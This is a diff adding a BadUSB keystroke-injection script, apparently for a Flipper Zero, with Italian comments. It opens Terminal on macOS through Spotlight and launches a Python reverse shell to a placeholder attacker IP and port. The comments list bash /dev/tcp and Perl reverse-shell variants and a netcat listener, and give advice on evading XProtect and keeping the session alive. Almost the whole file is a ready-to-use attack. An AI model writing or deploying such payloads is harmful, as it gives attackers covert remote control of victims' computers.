@@ -1,0 +1,45 @@
+REM ============================================================
+REM Title:    macOS Reverse Shell
+REM Target:   macOS 12+ (Monterey/Ventura/Sonoma)
+REM Author:   FlipperZero-guide
+REM Category: Reverse Shell
+REM Privs:    User (no root)
+REM Layout:   US (macOS default)
+REM Time:     ~8 secondi
+REM Detect:   Medio - Gatekeeper non blocca, ma XProtect potrebbe
+REM Desc:     Apre Terminale via Spotlight e lancia una reverse
+REM           shell Python verso il C2.
+REM           Listener: nc -lvnp ATTACKER_PORT
+REM CHANGE:   ATTACKER_IP e ATTACKER_PORT
+REM ============================================================
+
+DELAY 2000
+REM Apri Spotlight
+GUI SPACE
+DELAY 700
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1500
+
+REM Reverse shell Python (pre-installato su macOS)
+STRING python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/zsh","-i"])'
+ENTER
+
+REM ============================================================
+REM Alternative:
+REM
+REM Bash reverse shell:
+REM bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
+REM
+REM Perl reverse shell (se python non disponibile):
+REM perl -e 'use Socket;$i="ATTACKER_IP";$p=ATTACKER_PORT;
+REM socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+REM if(connect(S,sockaddr_in($p,inet_aton($i)))){
+REM open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
+REM exec("/bin/zsh -i");};'
+REM
+REM NOTA: macOS Gatekeeper non blocca comandi da Terminale.
+REM XProtect potrebbe segnalare pattern noti.
+REM Per evasion: usa nohup e disown per persistenza di sessione.
+REM ============================================================
